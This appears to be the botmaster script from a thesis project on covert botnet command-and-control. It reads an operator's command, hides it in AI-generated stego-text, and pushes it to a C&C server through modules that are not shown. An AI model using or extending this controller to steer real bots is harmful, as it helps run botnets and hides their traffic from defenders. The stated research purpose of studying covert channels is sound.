appHeader = """
#####################################################################
### ____  _  _   ___   __     ____   __  ____                     ###
###(  _ \( \/ ) / __) / _\   (  _ \ /  \(_  _)                    ###
### ) _ (/ \/ \( (_ \/    \   ) _ ((  O ) )(                      ###
###(____/\_)(_/ \___/\_/\_/  (____/ \__/ (__)                     ###
###---------------------------------------------------------------###
### A bot for researching hidden botnet communication.            ###
### By using generative AI for creating steganographic stego-text ###
###---------------------------------------------------------------###########################################################
### I, Arnoud Stolk, explicitly declare that I bear no responsibility for the application or misapplication of this project.#
### This project has been developed solely for research purposes.                                                           #
### The intention behind sharing this source code online is to supplement and support my thesis.                            #
### Upon completion and evaluation, the thesis will be published on the associated GitHub page.                             #
### For further information or inquiries, please visit https://github.com/arnoudx6/bmga.                                    #
#############################################################################################################################
"""

#First print a the cool header also warning the user that I bear no responsiblilty for the abuse
print(appHeader)

#Import standard modules
import time
from loguru import logger

#Import custom modules
import shared_modules.c2 as c2Module
import shared_modules.stego as stegoModule

#Initialize script variables
keepBotmasterActive = True
validStegoAlgorithms = stegoModule.getValidStegoAlgorithms()

logger.debug("Botmaster ready starting the command loop")

#This is an endless loop.
while keepBotmasterActive:
    logger.debug("Ready to process a new botnet command")

    #Ask for an instruction to send
    stegoAlgorithm = input("Enter a stego-algorithm {0}: ".format(validStegoAlgorithms)).upper()
    commandToSend = input("Enter a command to send: ")

    #Check the stego-algorithm input
    if not stegoAlgorithm or stegoAlgorithm not in validStegoAlgorithms:
        logger.error("Incorrect stego-algorithm entered")
        continue #<-- Go to the next loop itteration

    #Check if the embedded-text
    if not commandToSend or commandToSend == "":
        logger.error("No command provided")
        continue #<-- Go to the next loop itteration

    #Write logs
    logger.debug("Selected stego-algorithm: {0}".format(stegoAlgorithm))
    logger.debug("Entered command: {0}".format(commandToSend))

    ########Lookup table
    ########Put a lookup table here that can be used to transform the command
    embeddedText = commandToSend #<-- For now do this
    
    #Call the stego library and embed the embedded-text in a stego-text
    success, stegoText = stegoModule.embedEmbeddedTextInStegoText(embeddedText=embeddedText, stegoAlgorithm=stegoAlgorithm, stegoKey="blabla")
    if not success or not stegoText:
        logger.error("Error while embedding data")
        continue #<-- Go to the next loop itteration

    logger.debug("Stego-text: {0}".format(stegoText))

    #If we get here there is a stego-text. Now push the stego-text to the C&C.
    c2Module.push(stegoText=stegoText)


    logger.debug("End of command loop")
